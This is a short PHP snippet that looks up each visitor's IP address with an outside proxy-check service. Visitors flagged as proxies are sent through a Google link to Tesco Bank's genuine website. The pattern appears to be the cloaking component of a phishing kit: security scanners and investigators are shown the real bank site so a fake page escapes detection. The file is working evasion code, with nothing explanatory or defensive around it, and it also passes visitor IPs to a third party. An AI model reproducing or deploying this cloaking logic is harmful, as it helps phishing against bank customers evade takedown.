<?php

# Visitor proxy check snippet

$v_ip = $_SERVER['REMOTE_ADDR'];
$arContext['http']['timeout'] = 10;
$context = stream_context_create($arContext);

$response = file_get_contents('http://www.shroomery.org/ythan/proxycheck.php?ip='.$v_ip, 0, $context);

if ($response == 'Y') {
		header("Location: https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwiLg-vavcrIAhXHvxQKHbqCBsE&url=http%3A%2F%2Fwww.tescobank.com%2F&usg=AFQjCNFxbLY8e7eAvgdbpkSr6XsuU45iRA&sig2=lB70lca44qfDXl2kLMhDHw");
		die();
}

?>